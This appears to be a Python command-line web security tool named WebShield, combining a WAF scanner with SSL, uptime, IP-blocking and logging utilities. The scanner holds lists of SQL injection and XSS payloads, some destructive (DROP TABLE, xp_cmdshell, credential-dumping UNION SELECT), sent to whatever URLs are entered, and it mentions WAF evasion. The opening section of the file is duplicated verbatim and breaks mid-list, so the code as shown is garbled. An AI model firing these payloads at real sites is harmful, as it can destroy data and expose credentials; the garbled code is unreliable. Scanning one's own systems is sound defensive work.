import json, requests, time, re, random, datetime
import ssl, socket
from urllib.parse import urlparse
import os
import shutil

# === Config & Log ===
def load_config():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except:
        return {}

def log_event(message):
    with open("webshield.log", "a") as log_file:
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        log_file.write(f"{timestamp} {message}\n")

# === Developer Fix Report & Tips ===
def save_dev_fix_report(fixes):
    with open("DevFixReport.txt", "w") as f:
        f.write("===== Developer Fix Report (with OWASP References) =====\n\n")
        for fix in fixes:
            f.write(f"{fix}\n\n")
        f.write("=========================================================\n")
    print("[📄] DevFixReport.txt saved.")

def print_dev_tip(vuln_type):
    tips = {
        "SQLi": "[🛠] Tip: Use parameterized queries or ORM to prevent SQL Injection. Ref: https://owasp.org/Top10/A03_2021-Injection/",
        "XSS": "[🛠] Tip: Sanitize, validate, and encode all user inputs and outputs. Ref: https://owasp.org/Top10/A03_2021-Injection/",
        "WAF": "[🛠] Tip: Deploy and properly configure WAFs like ModSecurity, Cloudflare WAF, or AWS WAF.",
    }
    print(tips.get(vuln_type, "[ℹ] No tip available."))

# === Feature: WAF Scanner (Full large SQLi & XSS payload lists + auto-block + dev fix report) ===
def run_waf_scan(urls):
    print("\n[🔍] Running WAF Security Scan (Advanced SQLi & XSS)")

    # Full extended SQL Injection payloads
    sqli_payloads = [
        "' OR '1'='1' -- ",
        "' OR 1=1#",
        "'; exec xp_cmdshell('whoami') --",
        "' AND SLEEP(5) --",
        "' OR 1=1 UNION SELECT NULL,NULL--",
        "' OR 1=1 LIMIT 1 OFFSET 1--",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "') OR ('1'='1",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64 --",
        "' OR 1=1 ORDER BY 100--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%') --",
        "' OR 1 GROUP BY columnnames HAVING 1=1 --",
        "' AND 1=(SELECT COUNT(*) FROM tabname); --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "' AND 1=1#",
        "' OR 'a'='a' --",
        "'; EXEC xp_regread --",
        "' OR SLEEP(10) --",
        "' UNION SELECT NULL,NULL,NULL--",
        "' OR 'x'='x'; --",
        "' AND SUBSTRING(@@version,1,1)=5 --",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' OR 1=1#",
        "' OR 1=1--",
        "' OR '1'='1' /*",
        "' OR 1=1# --",
        "' OR 1=1--",
        "' OR 1=1 AND ''='",
        "'; EXEC sp_MSforeachtable 'DROP TABLE ?' --",
        "' OR 1=1; WAITFOR DELAY '0:0:5' --",
        "' OR BENCHMARK(1000000,MD5(1)) --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    ]

    # Full extended XSS payloads
    xss_payloads = [
        "<svg/onload=alert(1)>",
        "\"><script>alert(document.domain)</script>",
        "<img src=x onerror=confirm(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "<body onload=alert('XSS')>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<video><source onerror='alert(1)'>",
        "><svg><g onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<object data='javascript:alert(1)'>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "<input autofocus onfocus=alert(1)>",
        "<form action='javascript:alert(1)'><input type=submit></form>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<base href='javascript:alert(1)//'>",
        "<audio src='javascript:alert(1)' autoplay>",
        "<body onmouseover=alert(1)>",
        "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
        "<script>setTimeout('alert(1)', 0)</script>",
        "<svg><script>alert(1)</script></svg>",
        "<marquee onstart=alert(1)>",
        "<xml id='x'><x><script>alert(1)</script></x></xml>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<textarea autofocus onfocus=alert(1)>",
        "<isindex action='javascript:alert(1)'>",
]
import json, requests, time, re, random, datetime
import ssl, socket
from urllib.parse import urlparse
import os
import shutil

# === Config & Log ===
def load_config():
    try:
        with open("config.json", "r") as f:
            return json.load(f)
    except:
        return {}

def log_event(message):
    with open("webshield.log", "a") as log_file:
        timestamp = datetime.datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        log_file.write(f"{timestamp} {message}\n")

# === Developer Fix Report & Tips ===
def save_dev_fix_report(fixes):
    with open("DevFixReport.txt", "w") as f:
        f.write("===== Developer Fix Report (with OWASP References) =====\n\n")
        for fix in fixes:
            f.write(f"{fix}\n\n")
        f.write("=========================================================\n")
    print("[📄] DevFixReport.txt saved.")

def print_dev_tip(vuln_type):
    tips = {
        "SQLi": "[🛠] Tip: Use parameterized queries or ORM to prevent SQL Injection. Ref: https://owasp.org/Top10/A03_2021-Injection/",
        "XSS": "[🛠] Tip: Sanitize, validate, and encode all user inputs and outputs. Ref: https://owasp.org/Top10/A03_2021-Injection/",
        "WAF": "[🛠] Tip: Deploy and properly configure WAFs like ModSecurity, Cloudflare WAF, or AWS WAF.",
    }
    print(tips.get(vuln_type, "[ℹ] No tip available."))

# === Feature: WAF Scanner (Full large SQLi & XSS payload lists + auto-block + dev fix report) ===
def run_waf_scan(urls):
    print("\n[🔍] Running WAF Security Scan (Advanced SQLi & XSS)")

    # Full extended SQL Injection payloads
    sqli_payloads = [
        "' OR '1'='1' -- ",
        "' OR 1=1#",
        "'; exec xp_cmdshell('whoami') --",
        "' AND SLEEP(5) --",
        "' OR 1=1 UNION SELECT NULL,NULL--",
        "' OR 1=1 LIMIT 1 OFFSET 1--",
        "' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--",
        "') OR ('1'='1",
        "' AND ASCII(SUBSTRING((SELECT user()),1,1))>64 --",
        "' OR 1=1 ORDER BY 100--",
        "'; WAITFOR DELAY '00:00:05'--",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin' AND password LIKE '%') --",
        "' OR 1 GROUP BY columnnames HAVING 1=1 --",
        "' AND 1=(SELECT COUNT(*) FROM tabname); --",
        "' UNION SELECT username, password FROM users --",
        "'; DROP TABLE users; --",
        "' AND 1=1#",
        "' OR 'a'='a' --",
        "'; EXEC xp_regread --",
        "' OR SLEEP(10) --",
        "' UNION SELECT NULL,NULL,NULL--",
        "' OR 'x'='x'; --",
        "' AND SUBSTRING(@@version,1,1)=5 --",
        "' UNION ALL SELECT NULL,NULL,NULL--",
        "' OR 1=1#",
        "' OR 1=1--",
        "' OR '1'='1' /*",
        "' OR 1=1# --",
        "' OR 1=1--",
        "' OR 1=1 AND ''='",
        "'; EXEC sp_MSforeachtable 'DROP TABLE ?' --",
        "' OR 1=1; WAITFOR DELAY '0:0:5' --",
        "' OR BENCHMARK(1000000,MD5(1)) --",
        "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
    ]

    # Full extended XSS payloads
    xss_payloads = [
        "<svg/onload=alert(1)>",
        "\"><script>alert(document.domain)</script>",
        "<img src=x onerror=confirm(1)>",
        "<iframe src='javascript:alert(1)'>",
        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>",
        "<body onload=alert('XSS')>",
        "<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
        "<video><source onerror='alert(1)'>",
        "><svg><g onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<object data='javascript:alert(1)'>",
        "<link rel='stylesheet' href='javascript:alert(1)'>",
        "<input autofocus onfocus=alert(1)>",
        "<form action='javascript:alert(1)'><input type=submit></form>",
        "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>",
        "<style>@import 'javascript:alert(1)';</style>",
        "<base href='javascript:alert(1)//'>",
        "<audio src='javascript:alert(1)' autoplay>",
        "<body onmouseover=alert(1)>",
        "<img src='x' onerror='alert(String.fromCharCode(88,83,83))'>",
        "<script>setTimeout('alert(1)', 0)</script>",
        "<svg><script>alert(1)</script></svg>",
        "<marquee onstart=alert(1)>",
        "<xml id='x'><x><script>alert(1)</script></x></xml>",
        "<style>body{background:url('javascript:alert(1)')}</style>",
        "<textarea autofocus onfocus=alert(1)>",
        "<isindex action='javascript:alert(1)'>",
    ]

    waf_keywords = ["firewall", "blocked", "mod_security", "403 Forbidden", "Access Denied", "Request Denied"]
    vulnerabilities_found = 0
    dev_fixes = []

    for url in urls:
        for payload in sqli_payloads + xss_payloads:
            test_url = url + "?input=" + requests.utils.quote(payload)
            try:
                response = requests.get(test_url, timeout=5)
                body = response.text.lower()

                if any(k.lower() in body for k in waf_keywords):
                    print(f"[🔐] WAF or Firewall detected on: {test_url}")
                    log_event(f"[WAF] Possible WAF detected at {test_url}")
                    dev_fixes.append(f"[WAF Detected] at {test_url} — Consider adjusting WAF rules or using evasion techniques.")
                    continue

                # Heuristic checks for possible vulnerability indicators
                if payload.strip("'\"") in body or "syntax error" in body or "mysql_fetch" in body or "you have an error in your sql syntax" in body:
                    print(f"[⚠] Possible Vulnerability found on: {test_url}")
                    log_event(f"[!] Possible vulnerability at {test_url}")
                    vulnerabilities_found += 1

                    if "<script>" in payload or "alert" in payload or "onerror" in payload:
                        dev_fixes.append(f"[XSS] Vulnerability detected at {test_url}")
                        print_dev_tip("XSS")
                    else:
                        dev_fixes.append(f"[SQLi] Vulnerability detected at {test_url}")
                        print_dev_tip("SQLi")
                else:
                    print(f"[✅] Clean: {test_url}")
            except Exception as e:
                log_event(f"[!] Error testing {test_url}: {str(e)}")

    if dev_fixes:
        save_dev_fix_report(dev_fixes)

    print(f"\n[ℹ] Total vulnerabilities detected: {vulnerabilities_found}")
    return vulnerabilities_found

# === SSL Expiry Checker ===
def check_ssl_expiry(url):
    try:
        hostname = urlparse(url).hostname
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                expire_date = datetime.datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                days_left = (expire_date - datetime.datetime.utcnow()).days
                print(f"[🔒] {hostname} SSL certificate expires in {days_left} days.")
                if days_left < 15:
                    log_event(f"[SSL] {hostname} SSL certificate expiring soon ({days_left} days left)")
    except Exception as e:
        print(f"[!] SSL check failed for {url}: {e}")
        log_event(f"[SSL] Error for {url}: {e}")

# === Uptime Checker ===
def check_uptime(urls):
    up = down = 0
    for url in urls:
        try:
            r = requests.get(url, timeout=5)
            if r.status_code == 200:
                print(f"[✅] {url} is UP.")
                up += 1
            else:
                print(f"[❌] {url} is DOWN. Status: {r.status_code}")
                log_event(f"[Uptime] {url} returned status {r.status_code}")
                down += 1
        except:
            print(f"[❌] {url} is DOWN. No response.")
            log_event(f"[Uptime] {url} did not respond")
            down += 1
    return up, down

# === Rate Limiting (DDoS Simulation) ===
def simulate_rate_limit(max_requests):
    ip_counts = {}
    blocked = 0
    for i in range(100):
        ip = f"192.168.1.{random.randint(1,20)}"
        ip_counts[ip] = ip_counts.get(ip, 0) + 1
        if ip_counts[ip] > max_requests:
            block_ip(ip)
            blocked += 1
            print(f"[🚫] IP blocked due to rate limit: {ip}")
    print(f"[ℹ] Rate limit simulation complete. Blocked: {blocked} IPs")
    return blocked

# === Block IP & View IPs ===
def block_ip(ip):
    with open("blocked_ips.txt", "a") as f:
        f.write(ip + "\n")
    log_event(f"[Block] IP blocked: {ip}")

def view_blocked_ips():
    print("[📄] Blocked IPs:")
    try:
        with open("blocked_ips.txt", "r") as f:
            for line in f:
                print(" -", line.strip())
    except FileNotFoundError:
        print("[!] No IPs blocked yet.")

# === Archive Logs ===
def archive_logs():
    if not os.path.exists("webshield.log"):
        print("[!] No log file found.")
        return
    archive_dir = "archives"
    os.makedirs(archive_dir, exist_ok=True)
    timestamp = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    archive_path = os.path.join(archive_dir, f"log_{timestamp}.txt")
    shutil.copy("webshield.log", archive_path)
    print(f"[📦] Log archived to {archive_path}")
    log_event(f"[Archive] Log archived at {archive_path}")

# === Malware Link Scanner ===
def scan_malware_links(urls):
    suspicious_keywords = ["malware", "phishing", "suspicious", "trojan", "virus"]
    for url in urls:
        try:
            r = requests.get(url, timeout=5)
            if any(word in r.text.lower() for word in suspicious_keywords):
                print(f"[⚠] Potential malware indicators found in {url}")
                log_event(f"[Malware] Suspicious content found in {url}")
            else:
                print(f"[✅] {url} appears clean.")
        except Exception as e:
            print(f"[!] Failed to scan {url}: {e}")
            log_event(f"[Malware] Error scanning {url}: {e}")

# === Admin Summary Report ===
def generate_report(scans, vulns, uptime, downtime, blocked_ips):
    with open("AdminSummary.txt", "w") as f:
        f.write("=== WebShield Admin Summary Report ===\n\n")
        f.write(f"Total Scans Run: {scans}\n")
        f.write(f"Total Vulnerabilities Found: {vulns}\n")
        f.write(f"Uptime Checks: {uptime} UP / {downtime} DOWN\n")
        f.write(f"Blocked IPs: {blocked_ips}\n")
        f.write("======================================\n")
    print("[📄] AdminSummary.txt generated.")
    log_event("[Report] Admin summary report created.")

# === View Logs ===
def view_logs():
    try:
        with open("webshield.log", "r") as f:
            print(f.read())
    except FileNotFoundError:
        print("[!] No logs found.")

# === CLI Developer Help Submenu ===
def show_fix_help():
    print("""
=== Help: Fix Vulnerabilities (Dev Tips) ===
- [SQLi] Use prepared statements or stored procedures.
- [XSS] Encode output and use Content-Security-Policy headers.
- [WAF] Tune WAF rules to reduce false positives.
- Always validate and sanitize all inputs.
- See DevFixReport.txt for detailed fix suggestions.
============================================
""")

# === Main CLI ===
def main():
    urls = []
    blocked_ips = 0
    scans_run = 0
    vulns_found = 0
    uptime_up = 0
    uptime_down = 0

    while True:
        print("""
==== WebShield Security CLI Tool ====
1. WAF Scanner (SQLi + XSS)
2. SSL Expiry Checker
3. Uptime Monitor
4. Simulate DDoS Rate Limiting
5. Block IP
6. View Blocked IPs
7. Archive Logs
8. Malware Link Scanner
9. Generate Admin Summary Report
10. View Logs
11. Developer Help & Fix Tips
0. Exit
===================================
""")
        choice = input("Choose an option: ").strip()

        if choice == "0":
            print("Exiting WebShield. Stay safe!")
            break

        elif choice == "1":
            if not urls:
                input_urls = input("Enter URLs to scan (comma-separated): ")
                urls = [u.strip() for u in input_urls.split(",") if u.strip()]
            vulns = run_waf_scan(urls)
            scans_run += 1
            vulns_found += vulns

        elif choice == "2":
            if not urls:
                input_urls = input("Enter URLs to check SSL expiry (comma-separated): ")
                urls = [u.strip() for u in input_urls.split(",") if u.strip()]
            for url in urls:
                check_ssl_expiry(url)

        elif choice == "3":
            if not urls:
                input_urls = input("Enter URLs to check uptime (comma-separated): ")
                urls = [u.strip() for u in input_urls.split(",") if u.strip()]
            up, down = check_uptime(urls)
            uptime_up += up
            uptime_down += down

        elif choice == "4":
            limit = int(input("Enter max allowed requests per IP: "))
            blocked = simulate_rate_limit(limit)
            blocked_ips += blocked

        elif choice == "5":
            ip = input("Enter IP to block: ")
            block_ip(ip)
            blocked_ips += 1

        elif choice == "6":
            view_blocked_ips()

        elif choice == "7":
            archive_logs()

        elif choice == "8":
            if not urls:
                input_urls = input("Enter URLs to scan for malware links (comma-separated): ")
                urls = [u.strip() for u in input_urls.split(",") if u.strip()]
            scan_malware_links(urls)

        elif choice == "9":
            generate_report(scans_run, vulns_found, uptime_up, uptime_down, blocked_ips)

        elif choice == "10":
            view_logs()

        elif choice == "11":
            show_fix_help()

        else:
            print("[!] Invalid option. Please select from the menu.")

if __name__ == "__main__":
    main()
